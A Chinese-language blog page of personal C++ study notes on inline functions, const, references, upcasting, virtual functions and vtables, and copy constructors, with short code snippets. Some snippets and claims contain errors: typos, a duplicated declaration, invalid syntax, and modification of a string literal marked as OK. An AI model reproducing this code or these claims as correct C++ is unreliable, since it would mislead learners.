<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220816061432136.png" alt="image-20220816061432136"></p>
<h3 id="函数巨大-或者-递归函数都不能接受递归"><a href="#函数巨大-或者-递归函数都不能接受递归" class="headerlink" title="函数巨大 或者 递归函数都不能接受递归;"></a>函数巨大 或者 递归函数都不能接受递归;</h3><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220816061614972.png" alt="image-20220816061614972"></p>
<h3 id="Inline-inside-classes-在类中的函数body直接写在类中都是inline-内敛-的"><a href="#Inline-inside-classes-在类中的函数body直接写在类中都是inline-内敛-的" class="headerlink" title="Inline inside classes 在类中的函数body直接写在类中都是inline(内敛)的"></a>Inline inside classes 在类中的函数body直接写在类中都是inline(内敛)的</h3><ul>
<li>Any funciton you define inside a class declaration is automatically an inline.</li>
</ul>
<p>第二种: inline方法</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220816062031414.png" alt="image-20220816062031414"></p>
<p>Inline or not ?</p>
<ul>
<li><p>Inline: </p>
<ul>
<li>Small functions,2 or 3 lines</li>
<li>Frequently called functions, e.g. inside loops(循环里面大量调用))</li>
</ul>
</li>
<li><p>Not inline?</p>
<ul>
<li>Very large functions, more than 20 lines  (超过20行的函数)</li>
<li>Recursive functions (有递归的函数)</li>
</ul>
</li>
</ul>
<h1 id="第十五章-const"><a href="#第十五章-const" class="headerlink" title="第十五章 const"></a>第十五章 const</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> x=<span class="number">123</span>;</span><br><span class="line">x = <span class="number">27</span> <span class="comment">// illegal!	</span></span><br><span class="line">x++; <span class="comment">// illegal!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> y = x; <span class="comment">// ok, copy const to non-const</span></span><br><span class="line">y = x; <span class="comment">// ok, same thing</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> z = y; <span class="comment">// Ok, same thing</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> z = y; <span class="comment">// Ok, const is safer</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// const 在c++中 仍然是变量而不是常数</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220818195534252.png" alt="image-20220818195534252"></p>
<h2 id="Pointers-and-const"><a href="#Pointers-and-const" class="headerlink" title="Pointers and const"></a>Pointers and const</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220818195856488.png" alt="image-20220818195856488"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> * <span class="keyword">const</span> q = <span class="string">&quot;abc&quot;</span>; <span class="comment">// q is const</span></span><br><span class="line">*q = <span class="string">&#x27;c&#x27;</span>; <span class="comment">// OK</span></span><br><span class="line">q++; <span class="comment">//ERROR</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> * p =<span class="string">&quot;ABCD&quot;</span>;</span><br><span class="line">*p = <span class="string">&#x27;b&#x27;</span>; <span class="comment">//ERROR! (*p) is the const</span></span><br><span class="line"><span class="comment">// const 指通过这个const的变量无法修改值, 而不是值无法修改内存单元</span></span><br></pre></td></tr></table></figure>
<h2 id="const-指通过这个const的变量无法修改值-而不是值无法修改内存单元"><a href="#const-指通过这个const的变量无法修改值-而不是值无法修改内存单元" class="headerlink" title="const 指通过这个const的变量无法修改值, 而不是值无法修改内存单元"></a>const 指通过这个const的变量无法修改值, 而不是值无法修改内存单元</h2><p>const 写在 <strong>*</strong> 号的前面 即 <strong>const *</strong> 是说<strong>对象</strong>是const  // const在前 对象 const</p>
<p>const 写在 <strong>*</strong> 号的后面 即  <strong>* const</strong> 是说<strong>指针</strong>是const // const 在后 指针 const </p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220818201039906.png" alt="image-20220818201039906"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220818201434461.png" alt="image-20220818201434461"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> * s =<span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,s);  <span class="comment">// input: hello world!</span></span><br><span class="line">	s[<span class="number">0</span>] = <span class="string">&#x27;b&#x27;</span>;		<span class="comment">// change first variable &#x27;h&#x27; to &#x27;b&#x27;;  Error!</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,s); <span class="comment">// Error!</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 不可以修改s</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220818205923969.png" alt="image-20220818205923969"></p>
<h2 id="以const方式传一个指针-保证变量安全"><a href="#以const方式传一个指针-保证变量安全" class="headerlink" title="以const方式传一个指针, 保证变量安全"></a>以const方式传一个指针, 保证变量安全</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">funciotn</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> * x)</span></span>&#123;</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 保证x的值不会修改</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> Currency <span class="title">the_raise</span><span class="params">(<span class="number">42</span>,<span class="number">38</span>)</span></span>;</span><br><span class="line"><span class="comment">//整个对象为const</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220818210740334.png" alt="image-20220818210740334"></p>
<p>在函数的声明和定义的地方加const 表示不修改任何成员变量</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220818210817352.png" alt="image-20220818210817352"></p>
<blockquote>
<p>const 成员变量-&gt; “this” is const</p>
<p>即, this指针 不能改变成员变量</p>
</blockquote>
<h1 id="第十六章-不可修饰的对象"><a href="#第十六章-不可修饰的对象" class="headerlink" title="第十六章 不可修饰的对象"></a>第十六章 不可修饰的对象</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> Currency <span class="title">the_raise</span><span class="params">(<span class="number">42</span>, <span class="number">38</span>)</span></span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Class A &#123;</span><br><span class="line">	    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">public</span>: </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220819225636445.png" alt="image-20220819225636445"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasArray</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">int</span> array[size]; <span class="comment">//ERROR!</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// use &quot;anonymous enum&quot; hack</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasArray</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> size=<span class="number">100</span> &#125;;</span><br><span class="line">    <span class="keyword">int</span> array[size]; <span class="comment">//OK!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="第十七章-引用"><a href="#第十七章-引用" class="headerlink" title="第十七章 引用"></a>第十七章 引用</h1><pre><code>## Declaring reference
</code></pre><ul>
<li>References are a new data type in c++<ul>
<li>char c;</li>
<li>char *p = &c;</li>
<li>char&amp; r = c;</li>
</ul>
</li>
</ul>
<p>引用必须初始化: 初始值r是c的引用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char c;</span><br><span class="line">char&amp; r = c;</span><br></pre></td></tr></table></figure>
<p>在参数表或者有成员变量可以不用初始值</p>
<p>(本地变量/成员变量必须有初始值)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//References</span></span><br><span class="line">Declares a <span class="keyword">new</span> name <span class="keyword">for</span> an existing object</span><br><span class="line"><span class="keyword">int</span> X = <span class="number">47</span>;</span><br><span class="line"><span class="keyword">int</span>&amp; Y = X; <span class="comment">// Y is a reference to X</span></span><br><span class="line"><span class="comment">// X and Y now refer to the same variable</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Y = &quot;</span> &lt;&lt; y; <span class="comment">//prints Y = 47</span></span><br><span class="line">Y = <span class="number">18</span>;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;X = &quot;</span> &lt;&lt; x; <span class="comment">//prints X = 18</span></span><br><span class="line"><span class="comment">// 相当于X重新起了一个名字叫Y</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220819232331853.png" alt="image-20220819232331853"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> x = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">int</span>&amp; y = x;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span>&amp; z =x; <span class="comment">//z是x的别名,但通过z不能修改x;(与指针相同)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> * x)</span></span>&#123;</span><br><span class="line">	x++</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span>&amp; <span class="title">g</span><span class="params">(<span class="keyword">int</span>&amp; x)</span></span>&#123;</span><br><span class="line">    x++;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span>&amp; <span class="title">h</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> q;</span><br><span class="line">    <span class="comment">//! return q; //Error 因为返回类型是 int&amp; 而q是局部变量, 无法返回这个确切的符号</span></span><br><span class="line">	<span class="keyword">return</span> x; <span class="comment">// 合法, 因为x是全局变量 能够返回 (int&amp;)x ,即表示引用x</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">f</span>(&amp;a);  <span class="comment">// Ugly (but explicit)</span></span><br><span class="line">    <span class="built_in">g</span>(a);	<span class="comment">// Clean (but hidden)</span></span><br><span class="line">    <span class="built_in">h</span>() = <span class="number">16</span>; <span class="comment">//返回 (int&amp;)x 相当于 x的值变为16;</span></span><br><span class="line">    *<span class="built_in">k</span>() = <span class="number">10</span>; <span class="comment">//如果k()返回指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220819234249378.png" alt="image-20220819234249378"></p>
<h2 id="Pointers-VS-References"><a href="#Pointers-VS-References" class="headerlink" title="Pointers VS. References"></a>Pointers VS. References</h2><ul>
<li>References<ul>
<li>不能为空</li>
<li>依赖存在的变量, 是一个变量的别名</li>
<li>不能改变为别的变量</li>
</ul>
</li>
<li>Pointers<ul>
<li>能够设置为空</li>
<li>指针不依赖存在的对象</li>
<li>能够改变所指的地址</li>
</ul>
</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220819235409404.png" alt="image-20220819235409404"></p>
<blockquote>
<p>离变量最近的决定了变量的类型</p>
<p>int&amp; *p 表示取引用的指针</p>
<p>int* &amp;p 表示 p是引用 ,引用的类型为一个指针</p>
</blockquote>
<h1 id="第十八章-向上造型"><a href="#第十八章-向上造型" class="headerlink" title="第十八章 向上造型"></a>第十八章 向上造型</h1><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220820015606679.png" alt="image-20220820015606679"></p>
<h2 id="Conversion"><a href="#Conversion" class="headerlink" title="Conversion"></a>Conversion</h2><ul>
<li>if B isa A, you can use a B anywhere an A can be used.<ul>
<li>if B isa A, then everything that is true for A is also true of B</li>
</ul>
</li>
<li>Be careful if the substitution is not valid!</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220820021045805.png" alt="image-20220820021045805"></p>
<h2 id="子类和父类之间对象存在关系"><a href="#子类和父类之间对象存在关系" class="headerlink" title="子类和父类之间对象存在关系"></a>子类和父类之间对象存在关系</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">A</span>():<span class="built_in">i</span>(<span class="number">10</span>) &#123;&#125;</span><br><span class="line">	    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> &#123;</span></span><br><span class="line">	<span class="keyword">private</span>;</span><br><span class="line">    	<span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">public</span>: </span><br><span class="line">    	<span class="built_in">B</span>():<span class="built_in">j</span>(<span class="number">30</span>) &#123;&#125;</span><br><span class="line">		<span class="built_in">f</span>()&#123; cout &lt;&lt; <span class="string">&quot;B.j&quot;</span> &lt;&lt; j &lt;&lt; endl; &#125;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	A a;</span><br><span class="line">    B b;</span><br><span class="line">    <span class="keyword">int</span> *p = (<span class="keyword">int</span>*) &amp;b; <span class="comment">//允许</span></span><br><span class="line">	p++;</span><br><span class="line">    *p=<span class="number">50</span>;</span><br><span class="line">    b.<span class="built_in">f</span>(); <span class="comment">// Inputs: 50; 通过指针的强制转换也能访问到private变量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="若有一个子类的对象当做父类的对象来看了-叫做-Upcasting-向上造型"><a href="#若有一个子类的对象当做父类的对象来看了-叫做-Upcasting-向上造型" class="headerlink" title="若有一个子类的对象当做父类的对象来看了, 叫做 Upcasting(向上造型)"></a>若有一个子类的对象当做父类的对象来看了, 叫做 Upcasting(向上造型)</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220820023230816.png" alt="image-20220820023230816"></p>
<h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><blockquote>
<p>double a; int b = (int)a;</p>
</blockquote>
<h1 id="第十九章-多态性"><a href="#第十九章-多态性" class="headerlink" title="第十九章 多态性"></a>第十九章 多态性</h1><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220820023556185.png" alt="image-20220820023556185"></p>
<h2 id="Ineritance-in-C"><a href="#Ineritance-in-C" class="headerlink" title="Ineritance in C++"></a>Ineritance in C++</h2><blockquote>
<p>circle 圆 ; rectangel 矩形 ; ellipse 椭圆 ; </p>
</blockquote>
<ul>
<li>能够用给一个类定一个另一个类</li>
<li><p>比如说:</p>
<ul>
<li>椭圆是一种形状</li>
<li>圆是特殊的椭圆</li>
<li>矩形又是另一种形状</li>
<li>圆, 椭圆, 矩形的共同点<ul>
<li>属性(成员变量)</li>
<li>用途(成员函数)</li>
</ul>
</li>
<li>圆, 椭圆 和矩形都是不相同(not identical)</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220820024302890.png" alt="image-20220820024302890"></p>
</li>
</ul>
<h2 id="Polymorphism-多态性-virtual-void-render"><a href="#Polymorphism-多态性-virtual-void-render" class="headerlink" title="Polymorphism(多态性) virtual void render();"></a>Polymorphism(多态性) virtual void render();</h2><p>将来子类重新写了一个render(), 那么父类的render和子类的render是有联系的 ( 同名函数 )</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220820024952436.png" alt="image-20220820024952436"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">render</span><span class="params">(Shape * p)</span></span>&#123;</span><br><span class="line">    p-&gt;render; <span class="comment">// 对给定的shape的render() 执行正确的render函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220820025650906.png" alt="image-20220820025650906"></p>
<blockquote>
<p>virtual 动态绑定</p>
<p>你已经是一个成熟的shape了，应该知道自己怎么render()</p>
</blockquote>
<h1 id="第二十章-多态的实现"><a href="#第二十章-多态的实现" class="headerlink" title="第二十章 多态的实现"></a>第二十章 多态的实现</h1><p>多态性的实现<br>任何类的中的虚函数都会比原函数大一点</p>
<blockquote>
<p>mark：virtual的内存开头都有一个隐藏的VPtr指针，指向VTable这张表</p>
<p>注意: 图中的vtable是一个指针!</p>
</blockquote>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220821104240449.png" alt="image-20220821104240449"></p>
<blockquote>
<p> 虚函数的调用, 在虚函数表里头, 顺着虚函数表而找到对应的函数</p>
</blockquote>
<pre><code>## Ellipse 的对象和circle对象不太一样 vtable : virtual table
</code></pre><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220821132623022.png" alt="image-20220821132623022"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220821133120574.png" alt="image-20220821133120574"></p>
<blockquote>
<p>vtable没有变化, 调用的虚函数不会因此而改变</p>
<p>因此: Shape a; Ellipse b; a=b . vtpr: still is a ;</p>
</blockquote>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220821144705017.png" alt="image-20220821144705017"></p>
<h2 id="调用reference-和调用指针一样-都是动态绑定"><a href="#调用reference-和调用指针一样-都是动态绑定" class="headerlink" title="调用reference 和调用指针一样 都是动态绑定"></a>调用reference 和调用指针一样 都是动态绑定</h2><h2 id="Virtual-destructors"><a href="#Virtual-destructors" class="headerlink" title="Virtual destructors"></a>Virtual destructors</h2><blockquote>
<p>Make destructors <strong>virtual</strong> if they might be inherited</p>
</blockquote>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220821144538785.png" alt="image-20220821144538785"></p>
<h2 id="不能返回类-最好返回指针"><a href="#不能返回类-最好返回指针" class="headerlink" title="不能返回类 最好返回指针"></a>不能返回类 最好返回指针</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220821145713787.png" alt="image-20220821145713787"></p>
<h2 id="Overriding"><a href="#Overriding" class="headerlink" title="Overriding"></a>Overriding</h2><h2 id="覆盖-改写-virtual函数即是覆盖-改写"><a href="#覆盖-改写-virtual函数即是覆盖-改写" class="headerlink" title="覆盖/改写 (virtual函数即是覆盖/改写)"></a>覆盖/改写 (virtual函数即是覆盖/改写)</h2><h2 id="子类调用父类函数实例"><a href="#子类调用父类函数实例" class="headerlink" title="子类调用父类函数实例"></a>子类调用父类函数实例</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220821145143920.png" alt="image-20220821145143920"></p>
<h2 id="既有overloading-又有-override-即使是虚构函数也会发生-name-hidding"><a href="#既有overloading-又有-override-即使是虚构函数也会发生-name-hidding" class="headerlink" title="既有overloading 又有 override 即使是虚构函数也会发生 name hidding"></a>既有overloading 又有 override 即使是虚构函数也会发生 name hidding</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220821145435715.png" alt="image-20220821145435715"></p>
<h1 id="第二十一章-引用再讲究"><a href="#第二十一章-引用再讲究" class="headerlink" title="第二十一章 引用再讲究"></a>第二十一章 引用再讲究</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span>: </span><br><span class="line">    	<span class="keyword">int</span>&amp; m_u;</span><br><span class="line">    	<span class="built_in">X</span>(<span class="keyword">int</span>&amp; a);</span><br><span class="line">&#125;;</span><br><span class="line">X::<span class="built_in">X</span>(<span class="keyword">int</span>&amp; a) : <span class="built_in">m_y</span>(a) &#123; &#125; <span class="comment">// 引用必须要放在 initialize list 里头 否则会报错 </span></span><br></pre></td></tr></table></figure>
<p>返回的就是引用，而把引用（返回值）作为右边的值就是把引用的值赋值给左边<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">main</span>() &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> ; i&lt; SIZE ; i++) &#123;</span><br><span class="line">        myarray[i]= i * <span class="number">0.5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">double</span> value = <span class="built_in">subscrip</span>(<span class="number">12</span>);</span><br><span class="line">    <span class="built_in">subscrip</span>(<span class="number">3</span>) = <span class="number">34.5</span>;<span class="comment">// subsrcip(3) 是reference 所以 返回对象的变量会变成34.5</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220821235129732.png" alt="image-20220821235129732"></p>
<p>const 是函数对 调用者的保证</p>
<blockquote>
<p>Const reference parameters</p>
<p>What if you don’t want the argument changed?</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// y is a constant! Can&#x27;t be modified \</span></span><br><span class="line"><span class="comment">void funce(const int &amp; y , int &amp; z) &#123;</span></span><br><span class="line">	z = z *<span class="number">5</span>; <span class="comment">// ok</span></span><br><span class="line">	y+=<span class="number">8</span>; <span class="comment">// error!</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> &amp; i)</span></span>;</span><br><span class="line"><span class="built_in">func</span> (i*<span class="number">3</span>);<span class="comment">// Generates warining or error!</span></span><br><span class="line"><span class="comment">//因为引用是传 一个指针参数, 而不是单纯赋值, i*3 在内存中是存在于一个const的变量. 而int&amp;i因此无法接受这个变量</span></span><br></pre></td></tr></table></figure>
<h2 id="返回值-返回变量-对象"><a href="#返回值-返回变量-对象" class="headerlink" title="返回值, 返回变量/对象"></a>返回值, 返回变量/对象</h2><p>返回变量/对象 都可以做左值. 如果是返回值就不能做左值</p>
<h1 id="第二十二章-I-拷贝构造"><a href="#第二十二章-I-拷贝构造" class="headerlink" title="第二十二章 I 拷贝构造"></a>第二十二章 I 拷贝构造</h1><ul>
<li>Create a new  object from an exsiting one <ul>
<li>For example, when calling a function</li>
</ul>
</li>
</ul>
<h2 id="赋值和初始化-声明和定义"><a href="#赋值和初始化-声明和定义" class="headerlink" title="赋值和初始化   声明和定义"></a>赋值和初始化   声明和定义</h2><p>内存有不同</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">HowMany h2 = h; <span class="comment">// h2不会调用构造函数</span></span><br><span class="line"><span class="function">HowMany <span class="title">h2</span><span class="params">(<span class="number">10</span>)</span> </span>= h; <span class="comment">// h2会调用带参数的构造函数</span></span><br></pre></td></tr></table></figure>
<h2 id="拷贝构造-用等号初始化时-构造函数的参数要和等号传进来的参数有关联而初始化-叫做拷贝构造"><a href="#拷贝构造-用等号初始化时-构造函数的参数要和等号传进来的参数有关联而初始化-叫做拷贝构造" class="headerlink" title="拷贝构造: 用等号初始化时, 构造函数的参数要和等号传进来的参数有关联而初始化 叫做拷贝构造"></a>拷贝构造: 用等号初始化时, 构造函数的参数要和等号传进来的参数有关联而初始化 叫做拷贝构造</h2><p><code>T::T(const T&amp;)</code></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220822140006203.png" alt="image-20220822140006203"></p>
<p>不是字节对字节的拷贝. </p>
<p><strong>是成员对成员的拷贝</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">HowMany</span>( HowMany o) &#123; objectCount++;<span class="built_in">print</span>(<span class="string">&quot;HowMany(HM)&quot;</span>); &#125;</span><br><span class="line"><span class="comment">// 拷贝构造会再调用 HowMany o 里面的拷贝构造, 从而形成递归. 甚至递归没有出口</span></span><br><span class="line"><span class="built_in">HowMany</span>(<span class="keyword">const</span> HowMany &amp;o) &#123; objectCount++;<span class="built_in">print</span>(<span class="string">&quot;HowMany(HM)&quot;</span>); &#125;</span><br><span class="line"><span class="comment">//因此需要写成 `const HowMany &amp; o`  使得引用不会调用拷贝构造, 也只有这样才能进行拷贝构造</span></span><br></pre></td></tr></table></figure>
<h1 id="第二十二章-II-拷贝构造"><a href="#第二十二章-II-拷贝构造" class="headerlink" title="第二十二章 II 拷贝构造"></a>第二十二章 II 拷贝构造</h1><h2 id="自己不写一个拷贝构造-使用新的自动的拷贝构造时-新老指针指向同一块内存"><a href="#自己不写一个拷贝构造-使用新的自动的拷贝构造时-新老指针指向同一块内存" class="headerlink" title="自己不写一个拷贝构造, 使用新的自动的拷贝构造时, 新老指针指向同一块内存"></a>自己不写一个拷贝构造, 使用新的自动的拷贝构造时, 新老指针指向同一块内存</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220824014905286.png" alt="image-20220824014905286"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220824015523857.png" alt="image-20220824015523857"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Person.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220824020143603.png" alt="image-20220824020143603"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Person::<span class="built_in">Person</span> ( <span class="keyword">const</span> Person &amp; w)&#123;</span><br><span class="line">    name = <span class="keyword">new</span> <span class="keyword">char</span>[::<span class="built_in">strlen</span>(w.name) + <span class="number">1</span>];</span><br><span class="line">    ::<span class="built_in">strcpy</span>(name, w.name); <span class="comment">// 创建一个拷贝构造</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ::strcpy 指的是 std::strcpy(引用外部函数)</span></span><br></pre></td></tr></table></figure>
<p>声明拷贝构造 <code>w.name</code> 拿一个对象出来制造一个新的构造</p>
<h2 id="拷贝构造何时会被调用"><a href="#拷贝构造何时会被调用" class="headerlink" title="拷贝构造何时会被调用?"></a>拷贝构造何时会被调用?</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220824020723516.png" alt="image-20220824020723516"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Person baby_b = baby_a;</span><br><span class="line"><span class="function">person <span class="title">baby_c</span> <span class="params">(baby_a)</span></span>;</span><br><span class="line"><span class="comment">// 这两者是相等的	</span></span><br></pre></td></tr></table></figure>
